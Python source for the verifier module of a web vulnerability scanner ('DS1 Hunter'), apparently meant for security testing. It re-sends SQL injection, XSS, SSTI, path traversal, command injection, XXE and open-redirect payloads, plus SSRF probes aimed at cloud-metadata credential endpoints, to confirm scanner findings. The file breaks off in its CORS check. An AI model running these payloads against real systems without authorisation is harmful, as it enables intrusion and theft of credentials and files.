"""
DS1 Hunter - Verifier Module
DigitalSecurity1 - "Hunt. Chain. Prove."

Post-scan confirmation engine.  Takes active-scanner findings and re-tests
each one independently using class-specific logic.

Every verifier:
  1. Fetches a clean baseline of the endpoint first
  2. Re-injects the exact payload N times (3 for probabilistic, 1 for deterministic)
  3. Confirms the specific indicator against the baseline
  4. Returns a structured proof: raw request, response excerpt, match, human proof string

Statuses
  confirmed      - indicator reproduced in >=2/3 attempts, baseline clean
  likely         - reproduced in 1/3 attempts (intermittent / rate-limited)
  unconfirmed    - could not reproduce; server state or WAF may have changed
  false_positive - indicator already in baseline; original detection was noise
"""

import asyncio
import re
import threading
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
from core import scan_proxy
from core.session_store import (
    delete_session as _store_delete,
    load_sessions as _store_load,
    save_session as _store_save,
)

logger = __import__("logging").getLogger("ds1hunter.verifier")

_MODULE = "verifier"
_sessions: Dict[str, Dict[str, Any]] = {}
_lock = threading.Lock()

for _s in _store_load(_MODULE):
    _sessions[_s["id"]] = _s

# ── Shared patterns ───────────────────────────────────────────────────────────

_SQLI_ERRORS = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
    r"sqlite3\.OperationalError|SQLSTATE|Unclosed quotation mark|"
    r"Warning.*mysql_|You have an error in your SQL syntax|"
    r"supplied argument is not a valid MySQL|ODBC SQL Server Driver",
    re.I,
)
_TRAVERSAL_SIG = re.compile(r'root:[x*]:0:0|\[boot loader\]|\[fonts\]', re.I)
_CMD_ERROR_SIG = re.compile(
    r'sh: .*(not found|command not found)|'
    r'/bin/sh|/bin/bash|/usr/bin|'
    r'syntax error.*unexpected|'
    r'is not recognized as an internal or external command|'
    r'The term .* is not recognized|'
    r'uid=\d+\(.+\) gid=\d+|'        # Linux id output
    r'root:[x*]:0:0|'                  # /etc/passwd in output
    r'Volume Serial Number|'           # Windows dir output
    r'Microsoft Windows \[Version|'    # Windows ver output
    r'bash: line \d+:|'
    r'command not found',
    re.I,
)
_XXE_SIG = re.compile(r'root:[x*]:0:0|meta-data|instance-id|localhost', re.I)
_INFO_SIG = re.compile(
    r'php/[\d.]+|apache/[\d.]+|nginx/[\d.]+|django/[\d.]+|'
    r'stack trace|traceback \(most recent|exception in|fatal error|'
    r'internal server error|debug=true|sql error|database error',
    re.I,
)
_CSRF_TOKEN_RE = re.compile(
    r'csrfmiddlewaretoken|csrf.token|_token|__RequestVerificationToken|authenticity_token',
    re.I,
)

# ── Session management ────────────────────────────────────────────────────────

_INTERNAL_KEYS = {'findings', '_stop'}


def create_verification_session(
    scan_sid: str,
    findings: List[Dict],
    target_url: str,
    auth_header: str = '',
    extra_headers: Optional[Dict] = None,
) -> str:
    vsid = f'v{str(uuid.uuid4())[:11]}'
    with _lock:
        _sessions[vsid] = {
            'id':            vsid,
            'scan_sid':      scan_sid,
            'url':           target_url,
            'auth_header':   auth_header,
            'extra_headers': extra_headers or {},
            'running':       False,
            'done':          False,
            '_stop':         False,
            'started_at':    None,
            'finished_at':   None,
            'total':         len(findings),
            'verified':      0,
            'current_title': '',
            'findings':      findings,
            'results':       [],
            'summary': {
                'confirmed':      0,
                'likely':         0,
                'unconfirmed':    0,
                'false_positive': 0,
            },
            'error': None,
        }
    return vsid


def get_verification_session(vsid: str) -> Optional[Dict]:
    with _lock:
        s = _sessions.get(vsid)
        if not s:
            return None
        return {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}


def list_verification_sessions() -> List[Dict]:
    with _lock:
        return [
            {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}
            for s in _sessions.values()
        ]


def start_verification(vsid: str) -> bool:
    with _lock:
        s = _sessions.get(vsid)
        if not s or s['running']:
            return False
        s['running']    = True
        s['started_at'] = time.time()
    t = threading.Thread(target=_run, args=(vsid,), daemon=True, name=f'verify-{vsid[:8]}')
    t.start()
    return True


def stop_verification(vsid: str) -> None:
    with _lock:
        s = _sessions.get(vsid)
        if s:
            s['_stop'] = True


def delete_verification_session(vsid: str) -> bool:
    with _lock:
        if vsid not in _sessions:
            return False
        del _sessions[vsid]
    _store_delete(_MODULE, vsid)
    return True


def _set(vsid: str, **kw) -> None:
    with _lock:
        s = _sessions.get(vsid)
        if s:
            s.update(kw)


def _stopped(vsid: str) -> bool:
    with _lock:
        return _sessions.get(vsid, {}).get('_stop', False)


# ── Proof helpers ─────────────────────────────────────────────────────────────

def _fmt_request(method: str, url: str, headers: dict = None, body: str = None) -> str:
    p = urlparse(url)
    path = (p.path or '/') + (f'?{p.query}' if p.query else '')
    lines = [f'{method} {path} HTTP/1.1', f'Host: {p.netloc}']
    for k, v in (headers or {}).items():
        if k.lower() != 'host':
            lines.append(f'{k}: {v}')
    lines.append('Connection: close')
    if body:
        enc = body.encode('utf-8', errors='replace')
        lines.append(f'Content-Length: {len(enc)}')
        lines.append('')
        lines.append(body[:1000])
    return '\r\n'.join(lines)


def _excerpt(body: str, match_str: str, window: int = 400) -> str:
    if not body:
        return ''
    if not match_str:
        return body[:600]
    idx = body.lower().find(match_str.lower())
    if idx == -1:
        return body[:600]
    start = max(0, idx - 120)
    end   = min(len(body), idx + len(match_str) + window)
    out   = body[start:end]
    if start > 0:
        out = '...' + out
    if end < len(body):
        out = out + '...'
    return out


def _mutate_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _mutate_body(body: dict, param: str, value: str) -> dict:
    """Return a copy of body dict with param replaced by value (handles nested JSON)."""
    import copy
    result = copy.deepcopy(body)
    if param in result:
        result[param] = value
    else:
        # Try dot-notation for nested keys (e.g. "user.name")
        parts = param.split('.')
        node = result
        for part in parts[:-1]:
            if isinstance(node, dict) and part in node:
                node = node[part]
            else:
                result[param] = value  # flat fallback
                return result
        if isinstance(node, dict):
            node[parts[-1]] = value
    return result


async def _request_with_injection(
    http: aiohttp.ClientSession,
    method: str,
    url: str,
    param: str,
    value: str,
    body: dict = None,
    json_body: bool = False,
) -> tuple:
    """
    Make a request injecting value into param.
    Handles GET (query string), POST form, and POST JSON bodies.
    Returns (status, response_text).
    """
    to = aiohttp.ClientTimeout(total=10)
    try:
        if method.upper() == 'GET' or not body:
            tgt = _mutate_url(url, param, value)
            async with http.get(tgt, allow_redirects=False, timeout=to) as r:
                return r.status, await r.text(errors='replace')
        else:
            mutated = _mutate_body(body, param, value)
            if json_body:
                async with http.post(url, json=mutated, allow_redirects=False, timeout=to) as r:
                    return r.status, await r.text(errors='replace')
            else:
                async with http.post(url, data=mutated, allow_redirects=False, timeout=to) as r:
                    return r.status, await r.text(errors='replace')
    except Exception:
        return 0, ''


async def _baseline(http: aiohttp.ClientSession, url: str) -> str:
    try:
        async with http.get(url, allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=8)) as r:
            return await r.text(errors='replace')
    except Exception:
        return ''


def _curl_from_req_text(req_text: str, endpoint: str) -> str:
    """Derive a curl PoC from a raw HTTP request string."""
    method = 'GET'
    body_lines: list = []
    in_body = False
    for line in (req_text.replace('\r\n', '\n')).split('\n'):
        if in_body:
            if line:
                body_lines.append(line)
        elif not line.strip():
            in_body = True
        elif ' HTTP/' in line:
            method = line.split()[0].upper()
    url = endpoint or ''
    if not url:
        return ''
    parts = [f'curl -sk -X {method}', f"'{url}'"]
    if body_lines:
        body = '\n'.join(body_lines)[:400]
        parts.append(f"--data '{body}'")
    return ' '.join(parts)


def _build_proof(finding, hits, attempts, req_text, resp_text, match, human, timing=None, **extra):
    if hits >= 2:
        status     = 'confirmed'
        confidence = round(min(0.97, 0.70 + 0.15 * (hits / max(attempts, 1))), 3)
    elif hits == 1:
        status     = 'likely'
        confidence = 0.50
    else:
        status     = 'unconfirmed'
        confidence = 0.10
    curl_poc = _curl_from_req_text(req_text, finding.get('endpoint', ''))
    return {
        'title':            finding.get('title', ''),
        'severity':         finding.get('severity', ''),
        'endpoint':         finding.get('endpoint', ''),
        'status':           status,
        'confidence':       confidence,
        'attempts':         attempts,
        'hits':             hits,
        'request':          req_text,
        'response_excerpt': resp_text,
        'match':            match,
        'timing_delta':     timing,
        'human_proof':      human,
        'curl_poc':         curl_poc,
        **extra,
    }


def _proof_fp(finding, reason):
    return {
        'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
        'endpoint': finding.get('endpoint', ''), 'status': 'false_positive',
        'confidence': 0.0, 'attempts': 1, 'hits': 0,
        'request': '', 'response_excerpt': '', 'match': '',
        'timing_delta': None, 'human_proof': f'FALSE POSITIVE: {reason}',
        'curl_poc': '',
    }


def _proof_unconfirmed(finding, reason):
    ep = finding.get('endpoint', '')
    return {
        'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
        'endpoint': ep, 'status': 'unconfirmed',
        'confidence': 0.10, 'attempts': 1, 'hits': 0,
        'request': '', 'response_excerpt': '', 'match': '',
        'timing_delta': None, 'human_proof': f'Could not re-verify: {reason}',
        'curl_poc': f"curl -sk '{ep}'" if ep else '',
    }


def _proof_det(finding, req, resp, match, human):
    curl_poc = _curl_from_req_text(req, finding.get('endpoint', ''))
    return {
        'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
        'endpoint': finding.get('endpoint', ''), 'status': 'confirmed',
        'confidence': 0.95, 'attempts': 1, 'hits': 1,
        'request': req, 'response_excerpt': resp, 'match': match,
        'timing_delta': None, 'human_proof': human,
        'curl_poc': curl_poc,
    }


def _proof_confirmed(finding, _desc, req, resp, match, human):
    """Single-shot confirmed finding — used by gap verifiers where one attempt suffices."""
    curl_poc = _curl_from_req_text(req, finding.get('endpoint', ''))
    return {
        'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
        'endpoint': finding.get('endpoint', ''), 'status': 'confirmed',
        'confidence': 0.90, 'attempts': 1, 'hits': 1,
        'request': req, 'response_excerpt': resp, 'match': match,
        'timing_delta': None, 'human_proof': human,
        'curl_poc': curl_poc,
    }


# ── Per-class verifiers ───────────────────────────────────────────────────────

async def _v_sqli_error(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param   = ev.get('param', '')
    payload = ev.get('payload', "'")
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    hits = attempts = 3
    hits = 0
    match_text = req_text = resp_text = ''
    for _ in range(attempts):
        tgt = _mutate_url(url, param, payload)
        req_text = _fmt_request('GET', tgt)
        try:
            async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                body = await r.text(errors='replace')
            m = _SQLI_ERRORS.search(body)
            if m and not _SQLI_ERRORS.search(bl):
                hits += 1
                match_text = m.group(0)
                resp_text  = _excerpt(body, match_text)
        except Exception:
            pass
        await asyncio.sleep(0.4)
    human = (
        f'SQL error {match_text!r} reproduced {hits}/{attempts} times injecting {payload!r} '
        f'into param {param!r}. Clean baseline shows no DB errors.'
        if hits > 0 else
        f'SQL error NOT reproduced for payload {payload!r} on param {param!r} in {attempts} attempts. '
        'Endpoint may be patched, WAF-filtered, or rate-limited.'
    )
    return _build_proof(f, hits, attempts, req_text, resp_text, match_text, human)


async def _v_sqli_bool(f, http, bl):
    ev  = f.get('evidence', {}) or {}
    url = f['endpoint']
    param = ev.get('param', '')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    true_pl  = "' AND '1'='1'--"
    false_pl = "' AND '1'='2'--"
    attempts = 3
    hits = 0
    for _ in range(attempts):
        try:
            async with http.get(_mutate_url(url, param, true_pl),  allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                tb = await r.text(errors='replace'); ts, tl = r.status, len(tb)
            async with http.get(_mutate_url(url, param, false_pl), allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                fb = await r.text(errors='replace'); fs, fl = r.status, len(fb)
            diff = abs(tl - fl)
            if (ts != fs and fs in (404, 500) and ts == 200) or (diff > 50 and diff / max(tl, fl, 1) > 0.10):
                hits += 1
        except Exception:
            pass
        await asyncio.sleep(0.4)
    req_text = _fmt_request('GET', _mutate_url(url, param, true_pl))
    human = (
        f'Boolean differential confirmed {hits}/{attempts} times on param {param!r}. '
        f'True condition {true_pl!r} vs false {false_pl!r} produces consistently different '
        'response size or status — classic boolean-blind SQLi.'
        if hits > 0 else
        f'Boolean differential NOT reproduced for param {param!r} — responses now identical.'
    )
    return _build_proof(f, hits, attempts, req_text, '', '', human)


async def _v_sqli_time(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param   = ev.get('param', '')
    payload = ev.get('payload', "' AND SLEEP(5)--")
    db      = ev.get('db', 'Unknown')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    tgt      = _mutate_url(url, param, payload)
    req_txt  = _fmt_request('GET', tgt)
    tgt_host = urlparse(url).hostname or ''

    # Measure baseline response time first - threshold must be relative, not absolute.
    # A server that normally takes 3s needs 9s+ to confirm; a fast server needs only 4.5s.
    baseline_time = 1.0
    try:
        conn = scan_proxy.make_connector(limit=4, target_host=tgt_host)
        async with aiohttp.ClientSession(connector=conn) as bl_sess:
            t0 = time.monotonic()
            async with bl_sess.get(url, allow_redirects=False,
                                   timeout=aiohttp.ClientTimeout(total=10)) as r:
                await r.read()
            baseline_time = max(0.5, time.monotonic() - t0)
    except Exception:
        pass
    timing_threshold = max(4.5, baseline_time * 3)

    slow_to = aiohttp.ClientTimeout(total=max(20, int(timing_threshold) + 5))
    hits, attempts, delays = 0, 3, []
    for _ in range(attempts):
        try:
            conn = scan_proxy.make_connector(limit=4, target_host=tgt_host)
            async with aiohttp.ClientSession(connector=conn, timeout=slow_to) as sess:
                t0 = time.monotonic()
                async with sess.get(tgt, allow_redirects=False) as r:
                    await r.read()
                    el = time.monotonic() - t0
            delays.append(round(el, 2))
            if el >= timing_threshold:
                hits += 1
        except asyncio.TimeoutError:
            delays.append('>timeout')
            hits += 1
        except Exception:
            delays.append(0.0)
        await asyncio.sleep(1.0)
    avg = sum(d for d in delays if isinstance(d, float)) / max(len(delays), 1)
    human = (
        f'Time-based SQLi ({db}) confirmed: payload {payload!r} on param {param!r} '
        f'caused delays {delays} ({hits}/{attempts} hits >= threshold {timing_threshold:.1f}s, '
        f'baseline={baseline_time:.2f}s).'
        if hits > 0 else
        f'Time delay NOT reproduced for {payload!r} on param {param!r}. '
        f'Delays: {delays}, threshold: {timing_threshold:.1f}s (baseline={baseline_time:.2f}s). '
        'Possibly patched, cached, or now served behind a WAF.'
    )
    return _build_proof(f, hits, attempts, req_txt, '', '', human, timing=avg)


async def _v_xss_reflected(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param = ev.get('param', '')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    canary  = f'ds1vrfy{uuid.uuid4().hex[:8]}'
    payload = f'<script>alert("{canary}")</script>'
    tgt     = _mutate_url(url, param, payload)
    req_txt = _fmt_request('GET', tgt)
    hits = attempts = 3
    hits = 0
    resp_text = ''
    for _ in range(attempts):
        try:
            async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
            if canary in body and canary not in bl:
                hits += 1
                resp_text = _excerpt(body, canary)
        except Exception:
            pass
        await asyncio.sleep(0.3)
    human = (
        f'XSS canary {canary!r} reflected unencoded {hits}/{attempts} times via param {param!r}. '
        'Payload appears verbatim in response, absent from baseline.'
        if hits > 0 else
        f'XSS NOT reproduced for param {param!r} in {attempts} attempts. '
        'Input may now be encoded or endpoint behaviour changed.'
    )
    return _build_proof(f, hits, attempts, req_txt, resp_text, canary, human)


async def _v_xss_dom(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param = ev.get('param', '')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence for DOM XSS re-test')
    try:
        from playwright.async_api import async_playwright as _pw
    except Exception:
        return _proof_unconfirmed(f, 'Playwright not available for DOM XSS re-test')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    canary  = f'ds1domv{uuid.uuid4().hex[:6]}'
    payload = f'"><img src=x onerror=alert("{canary}")>'
    tgt     = _mutate_url(url, param, payload)
    req_txt = _fmt_request('GET', tgt)
    try:
        async with _pw() as pw:
            browser = await pw.chromium.launch(headless=True, args=['--no-sandbox', '--disable-dev-shm-usage'])
            ctx  = await browser.new_context(ignore_https_errors=True)
            page = await ctx.new_page()
            dialog_fired = False
            def _on_dialog(dlg):
                nonlocal dialog_fired
                if canary in (dlg.message or ''):
                    dialog_fired = True
                asyncio.ensure_future(dlg.dismiss())
            page.on('dialog', _on_dialog)
            await page.goto(tgt, wait_until='load', timeout=10000)
            await page.wait_for_timeout(1500)
            dom_hit = await page.evaluate(f'!!(document.body && document.body.innerHTML.includes("{canary}"))')
            await browser.close()
        confirmed = dialog_fired or dom_hit
        human = (
            f'DOM XSS confirmed: canary {canary!r} detected '
            f'(dialog={dialog_fired}, innerHTML={dom_hit}) after injecting into param {param!r}.'
            if confirmed else
            f'DOM XSS NOT reproduced for param {param!r}: canary absent from DOM after page load.'
        )
        if confirmed:
            return _proof_det(f, req_txt, '', canary, human)
        return _build_proof(f, 0, 1, req_txt, '', canary, human)
    except Exception as exc:
        return _proof_unconfirmed(f, f'Playwright error: {exc}')


async def _v_ssti(f, http, bl):
    ev      = f.get('evidence', {}) or {}
    url     = f['endpoint']
    param   = ev.get('param', '')
    orig_pl = ev.get('payload', '{{7*7}}')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')

    # Use a unique canary multiplication to avoid false positives from "49" appearing elsewhere.
    # Each engine has a different syntax - try the original payload first, then common alternatives.
    # Expected output for N*N where N is a random 4-digit number is unique enough.
    import random
    n   = random.randint(1000, 9999)
    expected = str(n * n)

    # Map original payload prefix to a canary expression for the same engine
    if orig_pl.startswith('{{'):
        canary_pl = f'{{{{{n}*{n}}}}}'                   # Jinja2 / Twig / Nunjucks
    elif orig_pl.startswith('${'):
        canary_pl = f'${{{n}*{n}}}'                      # Freemarker / Thymeleaf / SpEL
    elif orig_pl.startswith('#{'):
        canary_pl = f'#{{{n}*{n}}}'                      # Mako / Pug
    elif orig_pl.startswith('<%='):
        canary_pl = f'<%= {n}*{n} %>'                   # ERB / EJS
    elif orig_pl.startswith('*{'):
        canary_pl = f'*{{{n}*{n}}}'                      # Spring SpEL
    elif orig_pl.startswith('@('):
        canary_pl = f'@({n}+{n*n-n})'                   # Razor (addition equivalent)
    elif orig_pl.startswith('#set'):
        canary_pl = f'#set($x={n}*{n})$x'               # Velocity
    else:
        canary_pl = f'{{{{{n}*{n}}}}}'                   # default Jinja2

    tgt     = _mutate_url(url, param, canary_pl)
    req_txt = _fmt_request('GET', tgt)
    hits = 0
    attempts = 3
    resp_text = ''
    for _ in range(attempts):
        try:
            async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
            # Check for the unique expected result AND confirm it's absent from baseline
            if expected in body and expected not in bl:
                hits += 1
                resp_text = _excerpt(body, expected)
        except Exception:
            pass
        await asyncio.sleep(0.3)
    human = (
        f'SSTI confirmed: canary expression {canary_pl!r} evaluated to {expected!r} '
        f'({hits}/{attempts} times) in param {param!r}. '
        'Unique arithmetic result confirms server-side template execution, not coincidence.'
        if hits > 0 else
        f'SSTI NOT reproduced with canary {canary_pl!r} (expected {expected!r}) '
        f'on param {param!r} in {attempts} attempts.'
    )
    return _build_proof(f, hits, attempts, req_txt, resp_text, expected, human)


async def _v_traversal(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param   = ev.get('param', '')
    payload = ev.get('payload', '../../../etc/passwd')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    if _TRAVERSAL_SIG.search(bl):
        return _proof_fp(f, 'Traversal signature (root:x:0:0) already present in baseline response.')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    tgt     = _mutate_url(url, param, payload)
    req_txt = _fmt_request('GET', tgt)
    hits = attempts = 3
    hits = 0
    match_text = resp_text = ''
    for _ in range(attempts):
        try:
            async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
            m = _TRAVERSAL_SIG.search(body)
            if m and not _TRAVERSAL_SIG.search(bl):
                hits += 1
                match_text = m.group(0)
                resp_text  = _excerpt(body, match_text)
        except Exception:
            pass
        await asyncio.sleep(0.3)
    human = (
        f'Path traversal confirmed: payload {payload!r} on param {param!r} leaked '
        f'{match_text!r} {hits}/{attempts} times. File contents confirmed in response.'
        if hits > 0 else
        f'Traversal NOT reproduced for {payload!r} on param {param!r} in {attempts} attempts.'
    )
    return _build_proof(f, hits, attempts, req_txt, resp_text, match_text, human)


async def _v_cmdi(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param   = ev.get('param', '')
    payload = ev.get('payload', '; sleep 5')
    is_timing = ev.get('delay_sec') is not None or 'sleep' in payload.lower()
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    tgt      = _mutate_url(url, param, payload)
    req_txt  = _fmt_request('GET', tgt)
    tgt_host = urlparse(url).hostname or ''
    if is_timing:
        # Measure baseline first so threshold is relative to server speed
        baseline_time = 1.0
        try:
            conn = scan_proxy.make_connector(limit=4, target_host=tgt_host)
            async with aiohttp.ClientSession(connector=conn) as bl_sess:
                t0 = time.monotonic()
                async with bl_sess.get(url, allow_redirects=False,
                                       timeout=aiohttp.ClientTimeout(total=10)) as r:
                    await r.read()
                baseline_time = max(0.5, time.monotonic() - t0)
        except Exception:
            pass
        timing_threshold = max(4.5, baseline_time * 3)
        slow_to = aiohttp.ClientTimeout(total=max(20, int(timing_threshold) + 5))
        hits, attempts, delays = 0, 3, []
        for _ in range(attempts):
            try:
                conn = scan_proxy.make_connector(limit=4, target_host=tgt_host)
                async with aiohttp.ClientSession(connector=conn, timeout=slow_to) as sess:
                    t0 = time.monotonic()
                    async with sess.get(tgt, allow_redirects=False) as r:
                        await r.read()
                        el = time.monotonic() - t0
                delays.append(round(el, 2))
                if el >= timing_threshold:
                    hits += 1
            except asyncio.TimeoutError:
                delays.append('>timeout'); hits += 1
            except Exception:
                delays.append(0.0)
            await asyncio.sleep(1.0)
        avg = sum(d for d in delays if isinstance(d, float)) / max(len(delays), 1)
        human = (
            f'CMDi (timing) confirmed: payload {payload!r} on param {param!r} '
            f'caused delays {delays} ({hits}/{attempts} hits >= {timing_threshold:.1f}s threshold, '
            f'baseline={baseline_time:.2f}s).'
            if hits > 0 else
            f'CMDi timing NOT reproduced. Delays: {delays}, '
            f'threshold={timing_threshold:.1f}s (baseline={baseline_time:.2f}s).'
        )
        return _build_proof(f, hits, attempts, req_txt, '', '', human, timing=avg)
    else:
        hits = attempts = 3
        hits = 0
        match_text = resp_text = ''
        for _ in range(attempts):
            try:
                async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    body = await r.text(errors='replace')
                m = _CMD_ERROR_SIG.search(body)
                if m and not _CMD_ERROR_SIG.search(bl):
                    hits += 1
                    match_text = m.group(0)
                    resp_text  = _excerpt(body, match_text)
            except Exception:
                pass
            await asyncio.sleep(0.3)
        human = (
            f'CMDi (error) confirmed: {match_text!r} appeared {hits}/{attempts} times '
            f'injecting {payload!r} into param {param!r}. Absent from baseline.'
            if hits > 0 else
            f'CMDi error NOT reproduced for {payload!r} on param {param!r}.'
        )
        return _build_proof(f, hits, attempts, req_txt, resp_text, match_text, human)


async def _v_redirect(f, http, bl):
    ev   = f.get('evidence', {}) or {}
    url  = f['endpoint']
    param   = ev.get('param', '')
    payload = ev.get('payload', 'https://evil.com')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
    tgt     = _mutate_url(url, param, payload)
    req_txt = _fmt_request('GET', tgt)
    try:
        async with http.get(tgt, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
            loc    = r.headers.get('Location', '')
            status = r.status
        if status in (301, 302, 303, 307, 308) and 'evil.com' in loc:
            human = (
                f'Open redirect confirmed: {param!r}={payload!r} triggers '
                f'HTTP {status} redirect to {loc!r}. Attacker fully controls the redirect destination.'
            )
            return _proof_det(f, req_txt, f'HTTP {status}\nLocation: {loc}', loc, human)
        return _build_proof(f, 0, 1, req_txt, f'Status: {status}, Location: {loc!r}', '',
                            f'Redirect NOT confirmed. HTTP {status}, Location: {loc!r}')
    except Exception as exc:
        return _proof_unconfirmed(f, f'Request failed: {exc}')


async def _v_ssrf(f, http, bl):
    ev    = f.get('evidence', {}) or {}
    url   = f['endpoint']
    param = ev.get('param', '')
    if not param:
        return _proof_unconfirmed(f, 'No parameter in evidence')
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')

    # Try multiple SSRF targets - verifier must match what the scanner detected
    ssrf_probes = [
        # AWS IMDSv1
        ('http://169.254.169.254/latest/meta-data/',            ['ami-id', 'instance-id', 'local-ipv4']),
        ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', ['AccessKeyId', 'SecretAccessKey']),
        # GCP
        ('http://metadata.google.internal/computeMetadata/v1/', ['project-id', 'instance-id', 'serviceAccounts']),
        # Azure
        ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', ['subscriptionId', 'vmId']),
        # Alibaba
        ('http://100.100.100.200/latest/meta-data/',            ['instance-id', 'region-id']),
        # Internal services
        ('http://127.0.0.1:6379/',                              ['redis_version', '+PONG', 'NOAUTH']),
        ('http://127.0.0.1:9200/',                              ['elasticsearch', 'cluster_name']),
        ('http://localhost/server-status',                       ['Apache', 'requests/sec']),
        # File read via SSRF
        ('file:///etc/passwd',                                   ['root:x:0:0', 'bin:x:']),
    ]

    req_txt = hits = 0
    match_text = resp_text = confirmed_probe = ''
    attempts = 1  # one attempt per probe, multiple probes

    for probe_url, sigs in ssrf_probes:
        tgt = _mutate_url(url, param, probe_url)
        if not req_txt:
            req_txt = _fmt_request('GET', tgt)
        try:
            async with http.get(tgt, allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=8)) as r:
                body = await r.text(errors='replace')
            matched = [s for s in sigs if s.lower() in body.lower()
                       and s.lower() not in bl.lower()]
            if matched:
                hits += 1
                match_text     = matched[0]
                resp_text      = _excerpt(body, match_text)
                confirmed_probe = probe_url
                break  # confirmed, stop probing
        except Exception:
            pass
        await asyncio.sleep(0.2)

    human = (
        f'SSRF confirmed: probe {confirmed_probe!r} injected into param {param!r} '
        f'returned signature {match_text!r}. Server fetches arbitrary internal URLs.'
        if hits > 0 else
        f'SSRF NOT re-confirmed for param {param!r} across {len(ssrf_probes)} probe targets. '
        'Target may require specific cloud environment or SSRF was patched. '
        'Check OOB panel for blind SSRF callbacks.'
    )
    return _build_proof(f, hits, len(ssrf_probes), req_txt, resp_text, match_text, human)


async def _v_xxe(f, http, bl):
    url = f['endpoint']
    xxe = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>'
    )
    req_txt = _fmt_request('POST', url, headers={'Content-Type': 'application/xml'}, body=xxe)
    hits = attempts = 3
    hits = 0
    match_text = resp_text = ''
    for ct in ('application/xml', 'text/xml'):
        if hits >= 2:
            break
        for _ in range(attempts):
            try:
                async with http.post(url, data=xxe, headers={'Content-Type': ct},
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    body = await r.text(errors='replace')
                m = _XXE_SIG.search(body)
                if m and not _XXE_SIG.search(bl):
                    hits += 1
                    match_text = m.group(0)
                    resp_text  = _excerpt(body, match_text)
            except Exception:
                pass
            await asyncio.sleep(0.3)
    human = (
        f'XXE confirmed: external entity injection leaked {match_text!r} '
        f'{hits}/{attempts} times via file:///etc/passwd. '
        'Server processes external XML entities.'
        if hits > 0 else
        f'XXE NOT reproduced in {attempts} attempts. May be patched or endpoint changed CT handling.'
    )
    return _build_proof(f, hits, attempts, req_txt, resp_text, match_text, human)


async def _v_cors(f, http, bl):
    url         = f['endpoint']
    evil_origin = 'https://evil.ds1hunter.com'
